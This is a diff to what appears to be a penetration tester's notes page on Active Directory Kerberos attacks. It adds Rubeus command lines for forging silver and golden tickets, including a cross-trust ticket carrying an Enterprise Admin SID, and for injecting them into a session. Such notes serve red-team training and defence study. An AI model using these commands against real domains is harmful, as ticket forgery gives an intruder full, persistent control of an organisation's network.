@@ -41,6 +41,30 @@ A silver ticket can be forged with tool like safetykatz
 ```
 {% endcode %}
 
+Or with rubeus
+
+{% code overflow="wrap" %}
+```
+Rubeus.exe silver /service:<$Service> /rc4:<RC4A /ldap /sid:<$Domain SID> /user:Administrator /domain:<$Domain> /ptt
+```
+{% endcode %}
+
+## Golden Ticket
+
+Using the krbtgt aes previously obtained to craft a silver ticket
+
+{% code overflow="wrap" %}
+```
+Rubeus.exe golden /aes256:<aes> /ldap /sid:<$Domain SID> /user:Administrator /printcmd
+```
+{% endcode %}
+
+<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/image%20(10).png" alt=""><figcaption></figcaption></figure>
+
+Now use the generated command to print a golden ticket nad import it
+
+<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/image%20(11).png" alt=""><figcaption></figcaption></figure>
+
 ## Diamond Ticket
 
 ### Theory
@@ -74,3 +98,22 @@ kerberos::golden /user:Administrator /domain:<CURRENT DOMAIN> /sid:<CURRENT DOMA
 {% endcode %}
 
 <figure><img src="../../.gitbook/assets/Pasted image 20231113155053.png" alt=""><figcaption></figcaption></figure>
+
+or
+
+{% code overflow="wrap" %}
+```
+Rubeus.exe silver /user:Administrator /ldap /service:krbtgt/<$target Domain> /rc4:<$Trust RC4> /sids:<$Enterprise Admin SID> /nowrap
+```
+{% endcode %}
+
+<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/immagine%20(34).png" alt=""><figcaption></figcaption></figure>
+
+and use it to ask for a tgt
+
+<pre data-overflow="wrap"><code><strong>C:\AD\Tools\Rubeus.exe asktgs /service:&#x3C;$service> /dc:&#x3C;$Local DC> /ptt /ticket:&#x3C;$Ticket>
+</strong></code></pre>
+
+<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/immagine%20(35).png" alt=""><figcaption></figcaption></figure>
+
+\
